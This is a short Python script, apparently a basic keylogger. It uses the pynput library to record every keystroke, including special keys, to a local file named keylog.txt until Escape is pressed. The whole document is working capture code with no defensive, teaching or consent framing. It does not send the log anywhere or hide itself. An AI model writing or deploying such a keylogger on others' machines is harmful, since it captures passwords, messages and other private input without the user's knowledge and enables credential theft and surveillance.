from pynput import keyboard

# Path to save the logged keys
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, "a") as f:
            # Handle special keys (e.g., space, enter, etc.)
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when escape key is pressed
        return False

# Start listening to keystrokes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
